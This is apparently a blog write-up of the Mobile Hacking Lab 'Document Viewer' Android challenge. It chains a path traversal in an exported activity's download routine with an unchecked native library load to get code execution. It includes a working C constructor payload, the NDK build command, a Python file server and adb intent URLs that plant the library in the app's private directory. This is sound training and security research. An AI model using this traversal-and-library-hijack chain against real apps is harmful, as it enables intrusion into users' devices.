---
slug: document-viewer-mobile-hacking-lab
title: Document Viewer - Mobile Hacking Lab
authors: [wesam]
date: 2026-05-18
---

{/* truncate */}

### Objective

Exploit a combination of path traversal and native library hijacking vulnerabilities in an exported activity to achieve Remote Code Execution (RCE).

---

Opening the app shows a "Load PDF" button — pressing it displays the content of the chosen PDF on screen. No other interaction exists, so the next step is static analysis.
![image.png](/img/m4.png)


Reversed the APK using JADX and started with the manifest.

```xml
<uses-permission android:name="android.permission.INTERNET"/>
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
<uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
<uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>

<activity
    android:name="com.mobilehackinglab.documentviewer.MainActivity"
    android:exported="true">
    <intent-filter>
        <action android:name="android.intent.action.VIEW"/>
        <category android:name="android.intent.category.DEFAULT"/>
        <category android:name="android.intent.category.BROWSABLE"/>
        <data android:scheme="file"/>
        <data android:scheme="http"/>
        <data android:scheme="https"/>
        <data android:mimeType="application/pdf"/>
    </intent-filter>
</activity>
```

- The app has permissions to make network requests and full access over external storage
- `MainActivity` is exported with an intent filter handling `file://`, `http://`, `https://` schemes for `application/pdf` any external app or ADB can trigger it directly.
- Moved to `MainActivity` and analyzed `onCreate()`:

```java
handleIntent();
    loadProLibrary();
    if (this.proFeaturesEnabled) {
        initProFeatures();
    }
```

Two interesting functions analyzed both.

---

1. `handleIntent()` receives any incoming intents, do some simple checks then passes the URI straight to `copyFileFromUri()`:

```java
private final void handleIntent() {
    Intent intent = getIntent();
    String action = intent.getAction();
    Uri data = intent.getData();
    if (Intrinsics.areEqual("android.intent.action.VIEW", action) && data != null) {
        CopyUtil.INSTANCE.copyFileFromUri(data).observe(this, new MainActivity$sam$androidx_lifecycle_Observer$0(new Function1<Uri, Unit>() {
            {
                super(1);
            }

            @Override
            public /* bridge */ /* synthetic */ Unit invoke(Uri uri) throws FileNotFoundException {
                invoke2(uri);
                return Unit.INSTANCE;
            }

            public final void invoke2(Uri uri) throws FileNotFoundException {
                MainActivity mainActivity = MainActivity.this;
                Intrinsics.checkNotNull(uri);
                mainActivity.renderPdf(uri);
            }
        }));
    }
}
```

**Inside `copyFileFromUri()`:**

```java
Public final MutableLiveData<Uri> copyFileFromUri(Uri uri) {
  Intrinsics.checkNotNullParameter(uri, "uri");
  URL url = new URL(uri.toString());
  File file = CopyUtil.DOWNLOADS_DIRECTORY;
  String lastPathSegment = uri.getLastPathSegment();
   if (lastPathSegment == null) {
        lastPathSegment = "download.pdf";
       }
   File outFile = new File(file, lastPathSegment);
   MutableLiveData liveData = new MutableLiveData();
   BuildersKt__Builders_commonKt.launch$default(GlobalScope.INSTANCE, Dispatchers.getIO(), null, new CopyUtil$Companion$copyFileFromUri$1(outFile, url, liveData, null), 2, null);
   Return liveData;
        }
    }
```

This function takes the last segment of the URI and downloads the file into external storage using it as the filename:

- **Normal behavior:** `http://attacker/test.pdf` → `lastPathSegment = "test.pdf"` → saved to `/sdcard/Download/test.pdf`
- **The problem:** `getLastPathSegment()` auto URL-decodes the path — so `..%2F` becomes `../`, making `new File(DOWNLOADS_DIR, "../../...")` resolve the traversal and land the file anywhere on the filesystem the app can write to
- **With traversal:** `http://attacker/..%2F..%2Fdata%2Fdata%2F.../files/evil.so` → `lastPathSegment = "../../data/data/.../files/evil.so"` → saved to `/data/data/.../files/evil.so`
- This gives us a full control over where the file will be downloaded
- To confirm, created `testtt.pdf`, started a simple Python server, and triggered the activity via ADB:

```bash
adb shell am start -n com.mobilehackinglab.documentviewer/.MainActivity \
  -a android.intent.action.VIEW \
  -d "http://192.168.8.198:9999/testtt.pdf"
```

**As we expected it's downloaded in `/storage/emulated/0/Download/`**
![image.png](/img/m5.png)


---

- Then tested path traversal — encoded each `/` as `%2F` and pointed the URL into the app's private `files/` directory:

```bash
adb shell am start -n com.mobilehackinglab.documentviewer/.MainActivity \
  -a android.intent.action.VIEW \
  -d "http://192.168.8.198:8000/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fdata%2Fdata%2Fcom.mobilehackinglab.documentviewer%2Ffiles%2Ftesttt.pdf"
Starting: Intent { act=android.intent.action.VIEW dat=http://192.168.8.198:8000/... cmp=com.mobilehackinglab.documentviewer/.MainActivity }
```

**and It worked** `testtt.pdf` written outside the intended Downloads directory ![image.png](/img/m6.png)


<div style={{borderTop: '3px solid #25c2a0', margin: '40px 0'}} />

2. ***The second interesting function was `loadProLibrary()`***

```java
private final void loadProLibrary() {
    try {
        String abi = Build.SUPPORTED_ABIS[0];
        File libraryFolder = new File(getApplicationContext().getFilesDir(),
                                      "native-libraries/" + abi);
        File libraryFile = new File(libraryFolder, "libdocviewer_pro.so");
        System.load(libraryFile.getAbsolutePath());
        this.proFeaturesEnabled = true;
    } catch (UnsatisfiedLinkError e) {
        this.proFeaturesEnabled = false;
    }
}
```

| variable | value |
| --- | --- |
| abi | `x86_64`. It returns a list of all the architectures supported by the device (e.g., armeabi-v7a, arm64-v8a, x86, x86_64). |
| libraryFolder | `/data/data/com.mobilehackinglab.documentviewer/files/native-libraries/x86_64` |
| libraryFile | `/data/data/com.mobilehackinglab.documentviewer/files/native-libraries/x86_64/libdocviewer_pro.so` |
| proFeaturesEnabled | `false` |

- No `.so` is bundled in the APK — this path is empty by default
- `System.load()` executes whatever `.so` it finds there with no integrity check
- The full path is fully predictable → if we can plant our own `.so` there before the app loads, we get code execution
- The problem here is that the `libdocviewer_pro.so` is loaded from a predictable path: `/data/data/com.mobilehackinglab.documentviewer/files/native-libraries/<abi>/`. No `.so` is bundled in the APK this path is empty by default.
- `System.load()` executes whatever `.so` it finds there with no integrity check if we can plant our own `.so` at this path before the app loads it, we get code execution.
- This is exactly what the path traversal gives us.

<div style={{borderTop: '3px solid #25c2a0', margin: '40px 0'}} />

#### Chaining Both Vulnerabilities

- Wrote a C payload using `__attribute__((constructor))` — executes automatically the moment `System.load()` is called:

```c
#include <stdlib.h>

    __attribute__((constructor))
    void payload() {
        system("id > /data/data/com.mobilehackinglab.documentviewer/files/pwned.txt");
    }
```

- Compiled with Android NDK targeting `x86_64`:

```c
x86_64-linux-android21-clang.cmd -shared -fPIC -o libdocviewer_pro.so payload.c
```

---

- then hosted the out .so file on a custom HTTP server that serves the file on any request regardless of URL path, then triggered the download with path traversal pointing directly to the native libraries path

```python
from http.server import BaseHTTPRequestHandler, HTTPServer
import os

PDF_FILE_PATH = r"C:\\Users\\{user.name}\\Desktop\\test.pdf"

class PDFRequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        
        if self.path == "/test.pdf":
            if os.path.exists(PDF_FILE_PATH):
                try:
                    with open(PDF_FILE_PATH, "rb") as pdf_file:
                        self.send_response(200)
                        self.send_header("Content-Type", "application/pdf")
                        self.end_headers()
                        self.wfile.write(pdf_file.read())
                except Exception as e:
                    print(f"Error: {e}")
                    self.send_response(500)
                    self.end_headers()
                    self.wfile.write(b"Server error!")
            else:
                self.send_response(404)
                self.end_headers()
                self.wfile.write(b"File not found!")
        else:
            
            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.end_headers()
            self.wfile.write(b"<h1>PDF Server</h1><p>You can access the PDF file <a href='/test.pdf'>here</a>.</p>")

def run(server_class=HTTPServer, handler_class=PDFRequestHandler, port=8000):
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    print(f"Server is running: http://localhost:{port}")
    httpd.serve_forever()

if __name__ == "__main__":
    run(port=8000)
```

---

- Delivered the `.so` via path traversal directly to the native libraries directory:

```bash
adb shell am start -n com.mobilehackinglab.documentviewer/.MainActivity \
  -a android.intent.action.VIEW \
  -d "http://192.168.8.198:8000/..%2F..%2F..%2F..%2Fdata%2Fdata%2Fcom.mobilehackinglab.documentviewer%2Ffiles%2Fnative-libraries%2Fx86_64%2Flibdocviewer_pro.so"
```

- Confirmed it landed in the right place:

```bash
adb shell ls /data/data/com.mobilehackinglab.documentviewer/files/native-libraries/x86_64/
# libdocviewer_pro.so  ✓
```
![image.png](/img/m7.png)

---

- Force-stopped the app then restarted it so `loadProLibrary()` finds our `.so`, calls `System.load()`, and the payload fires:

```bash
adb shell am force-stop com.mobilehackinglab.documentviewer
adb shell am start -n com.mobilehackinglab.documentviewer/.MainActivity
```

- `pwned.txt` created with the output of `id` running inside the app's process —> **RCE confirmed**
![image.png](/img/m8.png)


---

**Root cause:** `copyFileFromUri()` uses `getLastPathSegment()` without sanitization , URL-encoded slashes decode into real path separators giving an arbitrary write primitive. `loadProLibrary()` loads a native library from a predictable attacker-writable path with no integrity check. Neither is exploitable alone, chained together they give full RCE.